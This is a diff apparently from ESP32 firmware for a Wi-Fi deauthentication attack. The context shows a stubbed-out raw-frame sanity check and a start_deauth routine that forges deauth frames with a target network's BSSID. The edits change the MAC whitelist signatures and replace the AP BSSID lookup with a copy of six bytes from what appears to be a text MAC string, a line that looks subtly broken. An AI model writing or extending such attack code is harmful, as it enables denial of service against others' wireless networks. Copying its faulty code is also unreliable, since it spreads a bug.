@@ -16,14 +16,14 @@ extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32
   return 0;
 }
 
-bool is_whitelisted(uint8_t* mac) {
+bool is_whitelisted(const uint8_t* mac) {
   for (int i = 0; i < whitelist_count; i++) {
     if (memcmp(whitelist[i], mac, 6) == 0) return true;
   }
   return false;
 }
 
-void add_to_whitelist(uint8_t* mac) {
+void add_to_whitelist(const uint8_t* mac) {
   if (whitelist_count < 10) {
     memcpy(whitelist[whitelist_count], mac, 6);
     whitelist_count++;
@@ -74,11 +74,7 @@ void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
     DEBUG_PRINT("Starting Deauth-Attack on network: ");
     DEBUG_PRINTLN(WiFi.SSID(wifi_number));
     WiFi.softAP(AP_SSID, AP_PASS, WiFi.channel(wifi_number));
-    wifi_mode_t mode;
-    esp_wifi_get_mode(&mode);
-    wifi_config_t conf;
-    esp_wifi_get_config(WIFI_IF_AP, &conf);
-    memcpy(ap_mac, conf.ap.bssid, 6);
+    memcpy(ap_mac, WiFi.softAPmacAddress().c_str(), 6);
     add_to_whitelist(ap_mac);
     memcpy(deauth_frame.access_point, WiFi.BSSID(wifi_number), 6);
     memcpy(deauth_frame.sender, WiFi.BSSID(wifi_number), 6);
